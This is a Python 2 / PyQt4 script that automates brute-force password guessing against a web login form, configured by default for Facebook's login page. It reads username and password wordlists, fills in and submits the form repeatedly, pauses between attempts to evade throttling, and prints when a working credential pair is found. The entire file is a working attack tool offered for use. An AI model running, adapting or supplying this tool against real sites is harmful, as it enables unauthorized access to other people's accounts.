#!/usr/bin/python -tt
# -*- coding: utf-8 -*-
# File   : main.py
# Author : Max Sidenstjärna
# Created: 16-10-26

import sys, time
from PyQt4.QtGui import *  
from PyQt4.QtCore import *  
from PyQt4.QtWebKit import *
from PyQt4 import QtCore

# Change to match target page
login_url = "http://www.facebook.com/login" # Login URL
username_input = "email" # Input id or name
password_input = "pass" # Input id or name
form_input = "login_form" # Form id or name
failed_string = "" # String from the html code thats uniq for the failed login page
success_string = "" # String from the html code thats uniq for the successfull login page

# Change agressivity
tries_before_sleep = 2
sleep_interval = 5

# Set wordlists
password_file = "pass.txt"
username_file = "user.txt"

# Dont change
user_line = 0
pass_line = 0
user_num_lines = sum(1 for line in open(username_file))
pass_num_lines = sum(1 for line in open(password_file))
number_of_tries = 0
check = False

# Function that will be run every time a page has finnished loaded
def set_input():
    global pass_line, user_line, number_of_tries, check

    
    #web.load( QUrl(login_url) )
    frame = web.page().currentFrame()
    html = unicode(frame.toHtml()).encode('utf-8')
    
    if check:
        check = False
        if failed_string in html:
            #print "Login credentials NOT found"
            web.load( QUrl(login_url) )
        elif success_string in html:
            print "Login credentials found"
            
            # Needs a way to logout before trying again after successfull login
            #web.load( QUrl(login_url) )
            exit(0)
    else:
        if (number_of_tries % tries_before_sleep) == 0:
            print "Sleeping " + str(sleep_interval) + " sec"
            time.sleep(sleep_interval)
        number_of_tries = number_of_tries + 1

        with open(password_file) as pass_f:
            for i, line in enumerate(pass_f):
                if i == 0:
                    password = line.strip()
                
                if i == pass_line -1:
                    prev_pass = line.strip()
                
                if i == pass_line:
                    pass_line = pass_line + 1
                    password = line.strip()
                    break
                elif i >= pass_num_lines-1:
                    pass_line = 1
                    user_line = user_line + 1
                    break
        
        with open(username_file) as user_f:
            for i, line in enumerate(user_f):
                if i == 0:
                    username = line.strip()
                
                if i == user_line-1:
                    prev_user = line.strip()
                
                if i == user_line:
                    username = line.strip()
                    break
                elif i >= user_num_lines-1:
                    print "Finnished"
                    #exit(0)
        
        print pass_line
        print user_line

        print "Trying: " + username + ":" + password
        
        check = True
        doc = web.page().mainFrame().documentElement()
        
        # Change "name=" to "id=" if thats how the page identifies the input
        user = doc.findFirst('input[name="' + username_input + '"]')
        user.setAttribute("value", username)

        # Change "name=" to "id=" if thats how the page identifies the input
        passwd = doc.findFirst('input[name="' + password_input + '"]')
        passwd.setAttribute("value", password)
        
        # Change "id=" to "name=" if thats how the page identifies the input
        form = doc.findFirst('input[id="login_form"]')
        #form.evaluateJavaScript("this.submit()")
        web.page().mainFrame().evaluateJavaScript("document.getElementById('login_form').submit();")

# Start QT App
app = QApplication(sys.argv)

web = QWebView()
web.load( QUrl(login_url) )
web.loadFinished.connect(set_input)

web.show()
app.exec_()
